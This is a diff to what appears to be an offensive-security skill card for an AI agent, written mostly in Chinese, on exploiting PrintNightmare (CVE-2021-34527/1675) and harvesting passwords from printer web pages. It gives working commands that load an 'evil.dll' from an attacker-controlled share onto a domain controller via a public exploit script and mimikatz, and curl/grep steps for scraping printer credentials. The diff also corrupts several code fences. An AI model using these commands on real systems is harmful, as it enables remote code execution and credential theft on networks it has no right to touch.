@@ -4,7 +4,7 @@ description: 'PrintNightmare CVE-2021-34527/1675 + Printer Web UI credential lea
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## PrintNightmare + Printer Credential Leaks
 
@@ -16,7 +16,7 @@ Print Spooler 服务 RCE + LPE。仍然在未打补丁的 Server 2019/2022 上�
 # 检查 Print Spooler 是否运行
 impacket-rpcdump.py @<DC_IP> | grep -A5 "MS-RPRN\|MS-PAR"
 nxc smb <DC_IP> -u <user> -p <pass> -M spooler
-```
+```text
 
 #### 利用
 ```bash
@@ -27,18 +27,18 @@ python3 CVE-2021-1675.py <domain>/<user>:<pass>@<DC_IP> '\\<ATTACKER_IP>\share\e
 # RCE (CVE-2021-34527) — 需要低权域用户
 git clone https://github.com/cube0x0/CVE-2021-34527
 python3 CVE-2021-34527.py <domain>/<user>:<pass>@<DC_IP> '\\<ATTACKER_IP>\share\evil.dll'
-```
+```bash
 
 mimikatz 方式:
 ```cmd
 mimikatz.exe "privilege::debug" "misc::printnightmare /server:<DC> /library:\\<ATTACKER_IP>\share\evil.dll" "exit"
-```
+```text
 
 ### Printer Credential Leaks
 打印机 Web UI 的 HTML 源码中常包含被 mask 的 admin 密码：
 ```html
 <input type="password" value="AdminPass123!">
-```
+```text
 查看页面源码即可看到明文。
 
 打印机扫描/打印任务中也可能包含明文文档（员工入职文件含用户名+初始密码）。
@@ -51,4 +51,4 @@ nmap -p 515,631,9100 <subnet>
 curl http://<printer_ip>/
 # 查看源码找密码
 curl http://<printer_ip>/ | grep -i 'password\|pass\|pwd'
-```
+```text
